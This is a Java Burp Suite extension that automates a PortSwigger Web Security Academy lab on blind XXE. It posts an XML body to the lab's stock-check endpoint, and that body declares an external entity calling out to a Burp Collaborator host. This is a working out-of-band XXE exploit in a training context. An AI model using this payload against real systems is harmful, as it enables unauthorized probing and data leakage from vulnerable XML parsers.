package labSolver;

import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.collaborator.CollaboratorClient;

import java.net.CookieHandler;
import java.net.CookieManager;
import java.io.IOException;
import java.net.URL;
import java.net.HttpURLConnection;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.net.URLEncoder;
import java.io.OutputStream;


public class LabSolver implements BurpExtension {
    private MontoyaApi api;
    private String labUrl;

    @Override
    public void initialize(MontoyaApi api) {
        this.api = api;
        this.labUrl = "https://0a9800cd0365d5bf84bc4a9b000300cf.web-security-academy.net/";
        CookieHandler.setDefault(new CookieManager());

        api.extension().setName("Lab: Blind XXE with out-of-band interaction");

        CollaboratorClient collaboratorClient = createCollaboratorClient();
        String payload = collaboratorClient.generatePayload().toString();

        try {
            sendRequest(payload);
        } catch (IOException e) {
            e.printStackTrace();
            api.logging().logToOutput("Error: " + e.getMessage());
        }

        api.extension().registerUnloadingHandler(() -> {
            api.logging().logToOutput("Extension unloading...");
        });
    }

    private CollaboratorClient createCollaboratorClient() {
        CollaboratorClient collaboratorClient;

        collaboratorClient = api.collaborator().createClient();

        return collaboratorClient;
    }

    private void sendRequest(String payload) throws IOException {
        URL url = new URL(labUrl + "product/stock");
        String data = String.format("""
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://%s" > ]>
    <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
    """, payload);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type", "text/xml");
        connection.setDoOutput(true);

        try (OutputStream os = connection.getOutputStream()) {
            os.write(data.getBytes());
            os.flush();
        }

        StringBuilder response = new StringBuilder();
        try (BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
            String line;
            while ((line = in.readLine()) != null) {
                response.append(line);
            }
        }

        api.logging().logToOutput("Response Body: " + response.toString());
    }
}
